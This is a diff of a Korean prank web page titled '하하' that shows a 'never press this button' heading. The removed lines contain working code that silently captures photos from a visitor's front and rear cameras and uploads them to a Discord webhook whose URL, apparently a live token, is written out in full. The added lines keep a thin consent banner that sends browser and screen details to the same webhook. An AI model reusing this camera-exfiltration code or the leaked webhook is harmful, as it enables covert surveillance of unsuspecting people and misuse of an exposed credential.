@@ -4,90 +4,22 @@
   <meta charset="UTF-8">
   <title>하하</title>
   <style>
-    body { text-align: center; font-family: Arial; margin-top: 30px; }
-    video, canvas { width: 300px; border-radius: 12px; margin-top: 10px; }
-    button { padding: 12px 20px; font-size: 16px; cursor: pointer; }
-  </style>
-</head>
-<body>
-
-<h2>절대 누르지 마시오!</h2>
-<button id="startBtn">버튼</button>
-
-<br>
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas" style="display:none;"></canvas>
-
-<script>
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1462758530867265591/MaQo0lAdsm7ai9PyWm-xV3XVImaU25BZIffI6oBO3uCXPIw0OhlGMT2q0hSsKDwyyu89";
-
-const video = document.getElementById("video");
-const canvas = document.getElementById("canvas");
-const ctx = canvas.getContext("2d");
-const startBtn = document.getElementById("startBtn");
-
-const PHOTOS_PER_CAMERA = 2;
-const INTERVAL = 1500;
-
-async function sendToDiscord(blob, name, label) {
-  const form = new FormData();
-  form.append("file", blob, name);
-  form.append("content", label);
-
-  await fetch(WEBHOOK_URL, {
-    method: "POST",
-    body: form
-  });
-}
-
-async function captureSequence(facingMode, label) {
-  const stream = await navigator.mediaDevices.getUserMedia({
-    video: { facingMode }
-  });
-
-  video.srcObject = stream;
-  await new Promise(r => setTimeout(r, 1000));
-
-  for (let i = 1; i <= PHOTOS_PER_CAMERA; i++) {
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    ctx.drawImage(video, 0, 0);
-
-    await new Promise(resolve => {
-      canvas.toBlob(async blob => {
-        await sendToDiscord(
-          blob,
-          `${label}_${i}.png`,
-          `📸 ${label} ${i}번째`
-        );
-        resolve();
-      }, "image/png");
-    });
-
-    await new Promise(r => setTimeout(r, INTERVAL));
-  }
-
-  stream.getTracks().forEach(t => t.stop());
-}
-
-startBtn.addEventListener("click", async () => {
-  try {
-    await captureSequence("user", "전면");
-    await captureSequence("environment", "후면");
-    alert("하하");
-  } catch (e) {
-    alert("다시 시도해주세요");
-  }
-});
-</script>
-
-<!DOCTYPE html>
-<html lang="ko">
-<head>
-  <meta charset="UTF-8">
-  <title>쿠키 동의</title>
-  <style>
-    body { font-family: Arial; }
+    body {
+      font-family: Arial;
+      text-align: center;
+      margin-top: 30px;
+    }
+    video, canvas {
+      width: 300px;
+      border-radius: 12px;
+      margin-top: 10px;
+    }
+    button {
+      padding: 12px 20px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 15px;
+    }
     #consent {
       position: fixed;
       bottom: 0;
@@ -96,47 +28,55 @@ startBtn.addEventListener("click", async () => {
       background: #222;
       color: #fff;
       padding: 15px;
-      display: none;
       text-align: center;
-    }
-    button {
-      margin-left: 10px;
-      padding: 6px 12px;
+      display: none;
     }
   </style>
 </head>
 <body>
 
-<h2>사이트 콘텐츠</h2>
+<h2>버튼을 절대 누르지마시오!</h2>
 
+<button id="startBtn" disabled>버튼</button>
+
+<br>
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<!-- 동의 배너 -->
 <div id="consent">
   이 사이트는 접속 환경 정보를 수집합니다.
   <button onclick="acceptConsent()">동의</button>
 </div>
 
 <script>
-const WEBHOOK_URL = "여기에_디스코드_웹훅_URL";
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1462758530867265591/MaQo0lAdsm7ai9PyWm-xV3XVImaU25BZIffI6oBO3uCXPIw0OhlGMT2q0hSsKDwyyu89";
 
+const startBtn = document.getElementById("startBtn");
+const consentBox = document.getElementById("consent");
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const ctx = canvas.getContext("2d");
+
+// ----- 동의 처리 -----
 function getInfo() {
   return {
-    userAgent: navigator.userAgent,
-    language: navigator.language,
-    platform: navigator.platform,
+    ua: navigator.userAgent,
+    lang: navigator.language,
     screen: `${screen.width}x${screen.height}`,
     time: new Date().toLocaleString()
   };
 }
 
-function sendToDiscord(info) {
+function sendInfoToDiscord(info) {
   fetch(WEBHOOK_URL, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
       content:
-`🧾 사용자 동의 후 수집 정보
-- 브라우저: ${info.userAgent}
-- 언어: ${info.language}
-- 플랫폼: ${info.platform}
+`✅ 사용자 동의
+- 브라우저: ${info.ua}
+- 언어: ${info.lang}
 - 화면: ${info.screen}
 - 시간: ${info.time}`
     })
@@ -145,14 +85,37 @@ function sendToDiscord(info) {
 
 function acceptConsent() {
   localStorage.setItem("consent", "yes");
-  document.getElementById("consent").style.display = "none";
-  const info = getInfo();
-  sendToDiscord(info);
+  consentBox.style.display = "none";
+  startBtn.disabled = false;
+  sendInfoToDiscord(getInfo());
 }
 
 if (!localStorage.getItem("consent")) {
-  document.getElementById("consent").style.display = "block";
+  consentBox.style.display = "block";
+} else {
+  startBtn.disabled = false;
 }
+
+// ----- 카메라 기능 -----
+startBtn.addEventListener("click", async () => {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    video.srcObject = stream;
+
+    setTimeout(() => {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0);
+
+      canvas.style.display = "block";
+      video.style.display = "none";
+
+      stream.getTracks().forEach(t => t.stop());
+    }, 2000);
+  } catch (e) {
+    alert("다시 시도 해주세요");
+  }
+});
 </script>
 
 </body>
